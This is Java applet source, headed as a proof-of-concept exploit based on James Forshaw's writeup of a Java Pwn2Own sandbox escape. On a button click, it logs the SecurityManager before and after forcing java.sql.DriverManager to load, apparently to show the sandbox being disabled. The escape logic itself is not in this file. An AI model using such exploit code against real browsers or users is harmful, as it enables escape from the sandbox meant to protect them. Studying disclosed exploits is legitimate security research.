/*
Proof-of-Concept exploit by axt based on the writeup by James Forshaw

http://www.contextis.com/research/blog/java-pwn2own/
http://axtaxt.wordpress.com
*/
import java.applet.Applet;
import java.awt.Button;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.StringWriter;
import java.sql.DriverManager;


public class MainApplet extends Applet {
	
	public static void log(String msg) {
		if (textarea != null) {
			textarea.append(msg+"\n");
		}
	}
	
	static TextArea textarea = null;
	Button button;

	@Override
	public void init() {
		super.init();
		textarea = new TextArea();
		this.add(textarea);
		button = new Button("LABEL");
		button.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				log("SM: " + System.getSecurityManager());
				try {
					Class.forName("java.sql.DriverManager");
				} catch (ClassNotFoundException e1) {
					StringWriter sw = new StringWriter();
					ByteArrayOutputStream bao = new ByteArrayOutputStream();
					e1.printStackTrace(new PrintStream(bao));
					log("EX: " + e1.getMessage());
					log("EX: " + new String(bao.toByteArray()));
				}
				log("SM: " + System.getSecurityManager());
			}
		});
		this.add(button);
	}
}
